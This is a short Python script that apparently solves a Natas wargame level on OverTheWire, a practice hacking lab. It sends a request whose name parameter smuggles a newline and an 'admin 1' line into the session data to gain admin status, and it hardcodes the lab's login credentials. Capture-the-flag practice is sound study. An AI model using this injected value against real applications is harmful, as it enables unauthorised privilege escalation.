import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth=HTTPBasicAuth('natas20','p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw')
url = "http://natas20.natas.labs.overthewire.org/index.php?name=a%201%0Aadmin%201"
r = requests.get(url,auth = basicAuth)
print(r.text)
